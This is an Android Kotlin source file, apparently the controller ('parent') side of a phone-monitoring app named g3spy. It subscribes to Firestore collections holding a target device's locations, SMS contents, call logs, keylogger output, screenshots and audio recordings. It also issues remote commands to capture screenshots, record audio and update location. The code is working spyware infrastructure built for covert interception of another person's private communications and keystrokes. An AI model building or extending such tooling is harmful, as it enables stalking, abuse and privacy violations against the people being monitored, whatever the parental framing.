package com.g3spy.parent.viewmodel

import android.util.Log
import androidx.lifecycle.ViewModel
import com.g3spy.parent.model.*
import com.google.firebase.Timestamp
import com.google.firebase.firestore.DocumentSnapshot
import com.google.firebase.firestore.FirebaseFirestore
import com.google.firebase.firestore.ListenerRegistration
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.flow.StateFlow
import java.util.*

/**
 * ViewModel that manages communication with Firebase for monitoring data
 */
class MonitoringViewModel : ViewModel() {
    companion object {
        private const val TAG = "MonitoringViewModel"
    }
    
    // Firebase instance
    private val firestore = FirebaseFirestore.getInstance()
    
    // Active listeners
    private val listeners = mutableListOf<ListenerRegistration>()
    
    // Data collections
    private val _locations = MutableStateFlow<List<LocationData>>(emptyList())
    val locations: StateFlow<List<LocationData>> = _locations
    
    private val _messages = MutableStateFlow<List<SmsData>>(emptyList())
    val messages: StateFlow<List<SmsData>> = _messages
    
    private val _calls = MutableStateFlow<List<CallData>>(emptyList())
    val calls: StateFlow<List<CallData>> = _calls
    
    private val _keylogs = MutableStateFlow<List<KeylogData>>(emptyList())
    val keylogs: StateFlow<List<KeylogData>> = _keylogs
    
    private val _screenshots = MutableStateFlow<List<ScreenshotData>>(emptyList())
    val screenshots: StateFlow<List<ScreenshotData>> = _screenshots
    
    private val _audioRecordings = MutableStateFlow<List<AudioRecordingData>>(emptyList())
    val audioRecordings: StateFlow<List<AudioRecordingData>> = _audioRecordings
    
    private val _deviceStatus = MutableStateFlow<DeviceStatus?>(null)
    val deviceStatus: StateFlow<DeviceStatus?> = _deviceStatus
    
    init {
        subscribeToCollections()
    }
    
    /**
     * Sets up listeners for all Firestore collections
     */
    private fun subscribeToCollections() {
        // Listen for location updates
        val locationListener = firestore.collection("locations")
            .orderBy("timestamp")
            .limit(100)
            .addSnapshotListener { snapshots, e ->
                if (e != null) {
                    Log.e(TAG, "Listen to locations failed", e)
                    return@addSnapshotListener
                }
                
                val locationList = snapshots?.documents?.mapNotNull { documentToLocation(it) } ?: emptyList()
                _locations.value = locationList
                Log.d(TAG, "Received ${locationList.size} locations")
            }
        listeners.add(locationListener)
        
        // Listen for SMS messages
        val smsListener = firestore.collection("sms_messages")
            .orderBy("timestamp")
            .limit(100)
            .addSnapshotListener { snapshots, e ->
                if (e != null) {
                    Log.e(TAG, "Listen to SMS messages failed", e)
                    return@addSnapshotListener
                }
                
                val smsList = snapshots?.documents?.mapNotNull { documentToSms(it) } ?: emptyList()
                _messages.value = smsList
                Log.d(TAG, "Received ${smsList.size} SMS messages")
            }
        listeners.add(smsListener)
        
        // Listen for call logs
        val callListener = firestore.collection("call_logs")
            .orderBy("timestamp")
            .limit(100)
            .addSnapshotListener { snapshots, e ->
                if (e != null) {
                    Log.e(TAG, "Listen to call logs failed", e)
                    return@addSnapshotListener
                }
                
                val callList = snapshots?.documents?.mapNotNull { documentToCall(it) } ?: emptyList()
                _calls.value = callList
                Log.d(TAG, "Received ${callList.size} call logs")
            }
        listeners.add(callListener)
        
        // Listen for keylogs
        val keylogListener = firestore.collection("keylogs")
            .orderBy("timestamp")
            .limit(100)
            .addSnapshotListener { snapshots, e ->
                if (e != null) {
                    Log.e(TAG, "Listen to keylogs failed", e)
                    return@addSnapshotListener
                }
                
                val keylogList = snapshots?.documents?.mapNotNull { documentToKeylog(it) } ?: emptyList()
                _keylogs.value = keylogList
                Log.d(TAG, "Received ${keylogList.size} keylogs")
            }
        listeners.add(keylogListener)
        
        // Listen for screenshots
        val screenshotListener = firestore.collection("screenshots")
            .orderBy("timestamp")
            .limit(50)
            .addSnapshotListener { snapshots, e ->
                if (e != null) {
                    Log.e(TAG, "Listen to screenshots failed", e)
                    return@addSnapshotListener
                }
                
                val screenshotList = snapshots?.documents?.mapNotNull { documentToScreenshot(it) } ?: emptyList()
                _screenshots.value = screenshotList
                Log.d(TAG, "Received ${screenshotList.size} screenshots")
            }
        listeners.add(screenshotListener)
        
        // Listen for audio recordings
        val audioListener = firestore.collection("audio_recordings")
            .orderBy("timestamp")
            .limit(50)
            .addSnapshotListener { snapshots, e ->
                if (e != null) {
                    Log.e(TAG, "Listen to audio recordings failed", e)
                    return@addSnapshotListener
                }
                
                val audioList = snapshots?.documents?.mapNotNull { documentToAudioRecording(it) } ?: emptyList()
                _audioRecordings.value = audioList
                Log.d(TAG, "Received ${audioList.size} audio recordings")
            }
        listeners.add(audioListener)
        
        // Listen for device status updates
        val statusListener = firestore.collection("device_status")
            .orderBy("lastConnectionTime")
            .limit(1)
            .addSnapshotListener { snapshots, e ->
                if (e != null) {
                    Log.e(TAG, "Listen to device status failed", e)
                    return@addSnapshotListener
                }
                
                val statusList = snapshots?.documents?.mapNotNull { documentToDeviceStatus(it) } ?: emptyList()
                _deviceStatus.value = statusList.firstOrNull()
                Log.d(TAG, "Received device status update")
            }
        listeners.add(statusListener)
    }
    
    /**
     * Refresh all data by re-querying Firestore
     */
    fun refreshAllData() {
        // For simplicity, we'll just unsubscribe and resubscribe
        // In a real app, you might want to refresh collections individually
        unsubscribeFromCollections()
        subscribeToCollections()
        Log.d(TAG, "Refreshed all data collections")
    }
    
    /**
     * Send a command to take a screenshot
     */
    fun requestScreenshot() {
        val command = hashMapOf(
            "command" to "SCREENSHOT",
            "params" to mapOf<String, Any>(),
            "timestamp" to Timestamp.now(),
            "isExecuted" to false
        )
        
        sendCommand(command)
    }
    
    /**
     * Send a command to start audio recording
     */
    fun requestAudioRecording(durationSeconds: Int = 60) {
        val command = hashMapOf(
            "command" to "AUDIO_RECORD",
            "params" to mapOf(
                "durationMs" to (durationSeconds * 1000L)
            ),
            "timestamp" to Timestamp.now(),
            "isExecuted" to false
        )
        
        sendCommand(command)
    }
    
    /**
     * Send a command to update location
     */
    fun requestLocationUpdate() {
        val command = hashMapOf(
            "command" to "LOCATION_UPDATE",
            "params" to mapOf<String, Any>(),
            "timestamp" to Timestamp.now(),
            "isExecuted" to false
        )
        
        sendCommand(command)
    }
    
    /**
     * Sends a command to the child device
     */
    private fun sendCommand(command: Map<String, Any>) {
        firestore.collection("remote_commands")
            .add(command)
            .addOnSuccessListener { documentReference ->
                Log.d(TAG, "Command sent with ID: ${documentReference.id}")
            }
            .addOnFailureListener { e ->
                Log.e(TAG, "Error sending command", e)
            }
    }
    
    /**
     * Clean up listeners when ViewModel is cleared
     */
    override fun onCleared() {
        super.onCleared()
        unsubscribeFromCollections()
    }
    
    /**
     * Removes all Firestore listeners
     */
    private fun unsubscribeFromCollections() {
        listeners.forEach { it.remove() }
        listeners.clear()
    }
    
    // Mapping functions to convert Firestore documents to data models
    
    private fun documentToLocation(document: DocumentSnapshot): LocationData? {
        return try {
            LocationData(
                id = document.id,
                latitude = document.getDouble("latitude") ?: 0.0,
                longitude = document.getDouble("longitude") ?: 0.0,
                accuracy = document.getDouble("accuracy")?.toFloat() ?: 0f,
                altitude = document.getDouble("altitude") ?: 0.0,
                timestamp = (document.getTimestamp("timestamp")?.toDate()?.time ?: 0L),
                isInsideGeofence = document.getBoolean("isInsideGeofence") ?: true
            )
        } catch (e: Exception) {
            Log.e(TAG, "Error parsing location data", e)
            null
        }
    }
    
    private fun documentToSms(document: DocumentSnapshot): SmsData? {
        return try {
            SmsData(
                id = document.id,
                sender = document.getString("sender") ?: "",
                recipient = document.getString("recipient") ?: "",
                content = document.getString("content") ?: "",
                timestamp = (document.getTimestamp("timestamp")?.toDate()?.time ?: 0L),
                isIncoming = document.getBoolean("isIncoming") ?: true
            )
        } catch (e: Exception) {
            Log.e(TAG, "Error parsing SMS data", e)
            null
        }
    }
    
    private fun documentToCall(document: DocumentSnapshot): CallData? {
        return try {
            CallData(
                id = document.id,
                phoneNumber = document.getString("phoneNumber") ?: "",
                contactName = document.getString("contactName"),
                timestamp = (document.getTimestamp("timestamp")?.toDate()?.time ?: 0L),
                duration = document.getLong("duration")?.toInt() ?: 0,
                callType = document.getString("callType") ?: "UNKNOWN"
            )
        } catch (e: Exception) {
            Log.e(TAG, "Error parsing call data", e)
            null
        }
    }
    
    private fun documentToKeylog(document: DocumentSnapshot): KeylogData? {
        return try {
            KeylogData(
                id = document.id,
                text = document.getString("text") ?: "",
                app = document.getString("app") ?: "",
                timestamp = (document.getTimestamp("timestamp")?.toDate()?.time ?: 0L)
            )
        } catch (e: Exception) {
            Log.e(TAG, "Error parsing keylog data", e)
            null
        }
    }
    
    private fun documentToScreenshot(document: DocumentSnapshot): ScreenshotData? {
        return try {
            ScreenshotData(
                id = document.id,
                imageUrl = document.getString("imageUrl") ?: "",
                timestamp = (document.getTimestamp("timestamp")?.toDate()?.time ?: 0L),
                appInForeground = document.getString("appInForeground") ?: ""
            )
        } catch (e: Exception) {
            Log.e(TAG, "Error parsing screenshot data", e)
            null
        }
    }
    
    private fun documentToAudioRecording(document: DocumentSnapshot): AudioRecordingData? {
        return try {
            AudioRecordingData(
                id = document.id,
                audioUrl = document.getString("audioUrl") ?: "",
                timestamp = (document.getTimestamp("timestamp")?.toDate()?.time ?: 0L),
                duration = document.getLong("duration")?.toInt() ?: 0
            )
        } catch (e: Exception) {
            Log.e(TAG, "Error parsing audio recording data", e)
            null
        }
    }
    
    private fun documentToDeviceStatus(document: DocumentSnapshot): DeviceStatus? {
        return try {
            DeviceStatus(
                id = document.id,
                batteryLevel = document.getLong("batteryLevel")?.toInt() ?: 0,
                isCharging = document.getBoolean("isCharging") ?: false,
                availableStorage = document.getLong("availableStorage") ?: 0L,
                deviceModel = document.getString("deviceModel") ?: "",
                androidVersion = document.getString("androidVersion") ?: "",
                lastConnectionTime = (document.getTimestamp("lastConnectionTime")?.toDate()?.time ?: 0L),
                isNetworkAvailable = document.getBoolean("isNetworkAvailable") ?: true,
                activeApp = document.getString("activeApp") ?: ""
            )
        } catch (e: Exception) {
            Log.e(TAG, "Error parsing device status data", e)
            null
        }
    }
}